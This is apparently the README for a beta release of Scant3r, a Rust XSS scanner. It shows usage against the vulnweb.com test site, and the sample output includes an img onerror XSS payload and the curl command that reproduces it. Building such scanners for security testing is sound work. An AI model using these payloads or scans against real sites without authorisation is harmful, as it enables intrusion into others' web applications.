Scant3r v0.9 #beta
this is a new release of scant3r written in Rust :crab:  read this for more information https://github.com/knassar702/scant3r/discussions/49
Also, don't forget to give us your opinion 

This git branch has an XSS scanner module you can use with this command without features like JSON output and logging.

you can download the bin file from the release page or compile it with yourself
don't forget to copy the payloads folder to your home directory or change the paths in the config file

```bash
$ cat urls.txt
http://testphp.vulnweb.com/listproducts.php?cat=1

$ cargo r -- scan --urls urls.txt --config config.yaml # or ./scant3r-binfile 
FOUND XSS
Reflect: Text("\nHello 451l2!\n\n")
Payload: <img/src=x onerror=alert()>
Match: <img onerror="alert()" src="x">
CURL: curl "http://testphp.vulnweb.com/listproducts.php?cat=%3Cimg%2Fsrc%3Dx+onerror%3Dalert%28%29%3E" -X GET
```

this xss scanner can catch the XSS vulnerability in
* attrname
* attr value
* normal text
* tagname
* HTML comments
